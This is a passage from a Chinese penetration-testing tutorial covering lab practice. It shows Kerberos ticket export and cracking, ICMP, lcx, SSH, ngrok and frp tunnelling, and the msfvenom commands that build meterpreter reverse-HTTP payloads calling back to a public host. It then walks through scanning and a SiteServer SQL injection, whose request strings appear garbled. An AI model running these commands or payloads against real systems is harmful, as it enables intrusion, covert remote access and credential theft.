
![](https://bbs.kanxue.com/upload/attach/202106/718877_JXQTKKT3SHYT8SF.png)

并用`mimikatz`将票据导出

`Kerberos::list /export`

![](https://bbs.kanxue.com/upload/attach/202106/718877_9GJ9D6KCKVBW7MW.png)

最后使用`tgsrepcrack.py`爆破得到相应密码。

# 六、隧道通信

## 6.1 网络层隧道

`ICMP`隧道是网络层常用的隧道之一。在`ICMP`协议中，设备间的通信是不需要开放相应的端口。当攻击者使用各类上层隧道进行通信均失败时，则可通过`ping`命令访问目标计算机，并尝试建立`ICMP`隧道，将`TCP`/`UDP`等相应需要传输的数据封装到`ping`数据包中，从而穿过防火墙实现通讯。其中`PingTunnel`是`ICMP`隧道的常用工具，可跨平台使用。下面使用该工具进行相应的操作：

先在受控端（`web`服务器）运行`PingTunnel`工具，执行开启隧道命令

```bash
sudo ./pingtunnel -type server
```

![](https://bbs.kanxue.com/upload/attach/202106/718877_AB5W5S5BHVS4WUJ.png)

在控制端（公网`vps`）执行下面命令，打开需要监听的本地端口，会把指定的服务器相应端口的数据封装在`ICMP`隧道中，以受控端（`web`服务器）为`IMCP`隧道跳板进行传输。

```bash
pingtunnel -type client -l :本地所监听的端口 -s 受控端IP -t 指定要转发的目标IP:指定要转发的目标端口 -tcp 1
pingtunnel -type client -l :33444 -s 192.168.74.132 -t 192.168.96.145:80 -tcp 1
```

![](https://bbs.kanxue.com/upload/attach/202106/718877_QK2JRKQ45MF9NWQ.png)

访问本地监听端口：

![](https://bbs.kanxue.com/upload/attach/202106/718877_C8ZWJ3GX3BUZKPD.png)

## 6.2 传输层隧道

`Lcx`是传输层经典的转发工具。`Lcx`是一个基于`Socket`套接字实现的转发工具，其`linux`版本为`portmap`。一个正常的`Socket`隧道必须具备两端：一端为服务端，负责监听一个端口并等待客户端连接；另一端为客户端，通过服务端的地址和端口与其连接，并转发相应的数据给服务端。

在自己的公网`vps`（即服务端）执行监听命令，将本机`4444`端口上监听的所有数据转发给本机的`5555`端口，以便其它机器访问。

```bash
Lcx.exe -listen 4444 5555
```

![](https://bbs.kanxue.com/upload/attach/202106/718877_2Y4S34KV657RGWU.png)

在受控端（即客户端）执行数据转发命令，将目标机器的`80`端口转发到公网`vps`的`4444`端口。

```bash
Lcx.exe -slave 公网ip 4444 目标机器IP 80
```

![](https://bbs.kanxue.com/upload/attach/202106/718877_FES9GHVB9CEN4KJ.png)

我们通过`vps`的`ip`和`5555`访问到目标机器的`80`端口：

![](https://bbs.kanxue.com/upload/attach/202106/718877_YA4Z42HDVAZX2PU.png)

同样地`lcx`也常用于本地端口映射，当目标服务器由于防火墙限制，部分端口没能通过防火墙时，可以将目标服务器响应端口数据转发到防火墙允许的端口。在目标服务器执行下面命令，即可把远程桌面转到`53`端口：

```bash
Lcx -tran 53 目标服务器IP 3389
```

## 6.3 应用层隧道

应用层的隧道通信主要利用应用软件提供的端口转发数据。常见的应用层隧道协议有`SSH`、`HTTP`、`DNS`等。其中`SSH`协议通常是被允许通过防火墙和边界设备的，且内网中`Linux`设备都支持`SSH`协议，同时`SSH`的传输过程是加密的，使得难以区分合法的`SSH`和攻击者建立的隧道。

常用的`SSH`隧道有以下几种类型：本地转发、远程转发、动态转发。`SSH`命令常用参数有:

`-C`：压缩传输，提高速度。
`-f`: 后台执行
`-N`:建立静默连接
`-g`:允许远程主机连接本地用于转发的端口
`-L`:本地端口转发
`-R`:远程端口转发
`-D`:动态端口转发
`-P`:指定`SSH`端口

本地转发：

在`VPS`执行如下相应命令，该命令以`web`服务器为跳板，将内网服务器的端口映射到公网的`vps`上，我们访问对应公网`vps`的端口即可。

```bash
Ssh -CfNg -L 公网VPS端口:目标主机IP:目标端口号 root@跳板机IP
```

远程转发：

当公网的`vps`不能访问访问到内网的服务器（包括`web`服务器），但`web`服务器能访问到公网的`vps`时，我们在`web`服务器执行如下相应命令，该命令以`web`服务器为跳板，将`vps`端口的流量转发到内网服务器相应端口上，我们访问对应公网`vps`的端口即可。

```bash
Ssh -CfNg -R vps端口:目标主机IP:目标端口号 root@跳板机IP
```

动态转发：

动态端口映射时建立一个`ssh`加密的`socks4/5`代理通道，任何支持`socks4/5`协议的程序都可以通过此通道进行代理访问。我们在`vps`上执行如下命令：

```bash
ssh -CfNg -D 7000 root@代理主机IP
```

## 6.4 Ngrok实现内网穿透

执行命令`./sunny clientid d8d99b5ff5d4996`

![](https://bbs.kanxue.com/upload/attach/202106/718877_C8KXY3PHT6RT74T.png)

访问对应的域名，确认能连接成功：

![](https://bbs.kanxue.com/upload/attach/202106/718877_DNUQHQK45N68J4S.png)

执行命令生成相应的`exe`：

```bash
msfvenom -p windows/meterpreter/reverse_http lhost=mai1zhi2.free.idcfengye.com lport=80 -f exe -o h7.exe
```

设置好相应的`payload`后，打开监听，运行`exe`：

![](https://bbs.kanxue.com/upload/attach/202106/718877_FADX3B7NE9YCSSV.png)

## 6.5 frp实现内网穿透

服务端默认监听端口是`7000`，执行命令，启动服务端 `./frps -c ./frps.ini`

![](https://bbs.kanxue.com/upload/attach/202106/718877_SYZ7DKFHGMAZBGS.png)

![](https://bbs.kanxue.com/upload/attach/202106/718877_ADBHQ5B6V5RXNDF.png)

启动客户端`frpc`配置文件:

```
[msf]
type = tcp
local_ip = 本地ip地址
local_port = 22222 转发给本机的22222端口，也就是msf的监听端口
remote_port = 6000 服务端打开6000端口进行监听
```

执行命令连接服务端：`./frpc -c ./frpc.ini`

![](https://bbs.kanxue.com/upload/attach/202106/718877_XEPPT8DSRAPMJ5C.png)

服务端显示有客户端连接：

![](https://bbs.kanxue.com/upload/attach/202106/718877_DREBEB9WEBZSMUR.png)

服务端开启`6000`端口进行监听

![](https://bbs.kanxue.com/upload/attach/202106/718877_JV8NVHRRYDKN8JM.png)

`Msf`生成`exe`文件：

```bash
msfvenom -p windows/meterpreter/reverse_http lhost=公网ip lport=公网ip监听的端口 -f exe -o h4.exe
```

执行`exe`上线：

![](https://bbs.kanxue.com/upload/attach/202106/718877_2TFZJ6EX3UM3HVF.png)

# 七、靶场实践

## 7.1 信息收集

这个靶场是月师傅所搭，我们用这个靶场作为实践，靶场拓扑图：

![](https://bbs.kanxue.com/upload/attach/202106/718877_3XX42FRFCWAD877.png)

先进行主机发现，方法有许多，分别是基于层面和工具上的不同：

1、使用`netdiscover`

```bash
sudo netdiscover -i eth0 -r 192.168.202.0/24
```

专用的二层发现工具。拥有主动和被动发现两种方式。

常用参数:
`-i`：网卡 选择你监控的网卡。比如`eth0`
`-r`：range 指定`IP`段。比如`192.168.0.0/24`
`-l`：filename 从文件读取`range`列表
`-p` 被动模式。默默的侦听指定的网卡以发现别的二层主机
`-t` `ARP`包发送间隔。单位毫秒。这个可以用来规避检测系统的告警。
`-c` 发包数量

2、使用`nmap`

```bash
nmap -v -sP 192.168.202.0/24
```

以上参数：
`-sP`、`ICMP`扫描： 类似于`ping`检测，快速判断目标主机是否存活，不做其他扫描

![](https://bbs.kanxue.com/upload/attach/202106/718877_S7VQR4YCFHUZVR6.png)

![](https://bbs.kanxue.com/upload/attach/202106/718877_9YQK4ST92HFNV56.png)

3、使用系统自带`ping`(速度稍慢)

```bash
for /L %I in (1,1,256) DO @ping -w 1 -l 1 192.168.202.%I | findstr "TTL="
fping -g 10.10.10.0/24
```

然后对所发现的主机进行端口扫描，同样也有不同工具来进行端口扫描：

1、`nmap`

```bash
nmap -sS -p 1-65535 -v 192.168.202.183
```

以上参数：
`-P` 指定端口扫描
`-V` 详细信息
`-sS`、`TCP SYN`扫描（半开扫描）： 只向目标发出`SYN`数据包，如果收到`SYN/ACK`响应包就认为目标端口正在监听，并立即断开连接；否则认为目标端口并未开放。
`-sT`、`TCP` 连接扫描： 这是完整的`TCP`扫描方式，用来建立一个`TCP`连接，如果成功则认为目标端口正在监听服务，否则认为目标端口并未开放。
`-sF`、`TCP FIN`扫描： 开放的端口会忽略这种数据包，关闭的端口会回应`RST`数据包。许多防火墙只对`SYN`数据包进行简单过滤，而忽略了其他形式的`TCP`攻击包。这种类型的扫描可间接检测防火墙的健壮性。
`-sU`、`UDP`扫描： 探测目标主机提供哪些`UDP`服务，`UDP`扫描的速度会比较慢。

![](https://bbs.kanxue.com/upload/attach/202106/718877_9AUXVW657UDYFY4.png)

识别对应的端口

```bash
nmap -sV -A 192.168.202.183 -p 80,53,6588,5985,3389,135,21,999 -oA myAttackPorts
```

`-sV`: 探测相应服务版本号
`-A`: 综合扫描，包含`1-10000`的端口`ping`扫描，操作系统扫描，脚本扫描，路由跟踪，服务探测
`-oA`：同时在三个主要的格式文档输出扫描结果

![](https://bbs.kanxue.com/upload/attach/202106/718877_TBRDDWP33AE9HTG.png)

![](https://bbs.kanxue.com/upload/attach/202106/718877_TWJEJKGZR3DGEWT.png)

使用`xsltproc`美化结果输出文档：

```bash
xsltproc -o attck.html mode.xsl myAttackPorts.xml
```

![](https://bbs.kanxue.com/upload/attach/202106/718877_EVY2JF5EYFHCDCH.png)

2、`masscan`

```bash
sudo masscan -p 1-65535 192.168.202.183 --rate=1000
```

常用参数：
`-p <ports,--ports <ports>>` 指定端口进行扫描
`--banners` 获取`banner`信息，支持少量的协议
`--rate <packets-per-second>` 指定发包的速率，默认的速率是`100`包/秒

![](https://bbs.kanxue.com/upload/attach/202106/718877_J7N44XAK423U7XZ.png)

绑定域名，再对其`ddbK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3#2G2L8$3&6D9j5h3u0Q4x3X3g2U0L8$3#2Q4c8e0S2Q4b7V1k6Q4z5f1u0Q4c8e0S2Q4b7e0q4Q4z5p5y4Q4c8e0N6Q4z5f1u0Q4b7f1g2Q4c8e0g2Q4b7V1c8Q4z5e0g2Q4c8e0N6Q4z5o6S2Q4z5o6k6Q4c8e0N6Q4b7e0m8Q4b7U0c8Q4c8f1k6Q4b7V1y4Q4z5p5x3`.

![](https://bbs.kanxue.com/upload/attach/202106/718877_GSX7X5T5Y7TN5KT.png)

如果用`kali`自带的`dirbuster`工具会因为`UA`和速度等问题被拦截：

![](https://bbs.kanxue.com/upload/attach/202106/718877_4V9EFGY9HNGHPVW.png)

![](https://bbs.kanxue.com/upload/attach/202106/718877_DRDANTVV9HH26AT.png)

所以我们可以自己编写脚本进行目录的爆破，每间隔`0.5`秒进行请求操作：

![](https://bbs.kanxue.com/upload/attach/202106/718877_Q3XK7E8Q3N3BPBB.png)

![](https://bbs.kanxue.com/upload/attach/202106/718877_U2P2S62W76GU3WV.png)

## 7.2 web漏洞

访问网址可知，这是`siteserver3.6.1`，从网上找到该版本报错注入的相关`poc`，获得数据库版本信息：

`9eeK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3#2G2L8$3&6D9j5h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6#2M7$3g2J5j5$3g2F1N6r3g2J5i4K6u0r3M7r3I4S2N6r3k6G2M7X3#2Q4x3V1k6#2M7$3g2J5i4K6u0W2j5i4y4H3P5q4)9K6c8W2g2F1e0r3!0U0K9#2)9K6c8s2y4V1k6X3g2Q4x3U0f1J5y4#2)9J5y4X3q4E0M7q4)9K6b7W2g2K6k6i4u0z5j5h3#2W2b7$3!0D9L8r3g2U0N6r3W2G2L8W2)9K6c8s2c8W2M7%4c8Q4x3U0f1J5y4#2)9J5z5g2)9J5y4e0t1H3j5h3&6V1i4K6t1^5y4K6q4Q4x3U0W2Q4x3U0f1J5b7X3y4Z5j5i4u0Q4x3U0R3$3y4g2)9J5z5g2)9J5y4e0u0n7j5$3S2S2M7W2)9J5z5o6M7&6i4K6t1&6i4K6t1#2x3V1u0U0K9r3q4J5i4K6t1^5y4K6c8Q4x3U0W2Q4x3U0f1J5b7X3y4Z5j5i4u0Q4x3U0R3%4x3#2)9J5z5g2)9J5y4e0u0n7i4K6b7H3i4K6b7H3N6X3g2J5M7$3W2G2L8W2)9K6c8o6u0Q4x3@1u0Q4x3U0f1J5x3q4)9J5k6q4)9J5k6l9`.`.

![](https://bbs.kanxue.com/upload/attach/202106/718877_J8X63NY89QUWHT3.png)

获得数据库名：

`401K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3#2G2L8$3&6D9j5h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6#2M7$3g2J5j5$3g2F1N6r3g2J5i4K6u0r3M7r3I4S2N6r3k6G2M7X3#2Q4x3V1k6#2M7$3g2J5i4K6u0W2j5i4y4H3P5q4)9K6c8W2g2F1e0r3!0U0K9#2)9K6c8s2y4V1k6X3g2Q4x3U0f1J5y4#2)9J5y4X3q4E0M7q4)9K6b7W2g2K6k6i4u0z5j5h3#2W2b7$3!0D9L8r3g2U0N6r3W2G2L8W2)9K6c8s2c8W2M7%4c8Q4x3U0f1J5y4#2)9J5z5g2)9J5y4e0t1H3j5h3&6V1i4K6t1#2x3U0m8V1j5W2)9#2k6X3&6S2L8h3g2Q4x3U0S2Q4x3U0W2Q4x3@1c8Q4y4@1f1J5i4K6y4n7i4K6t1#2x3U0m8Q4x3X3c8Q4x3X3b7`.
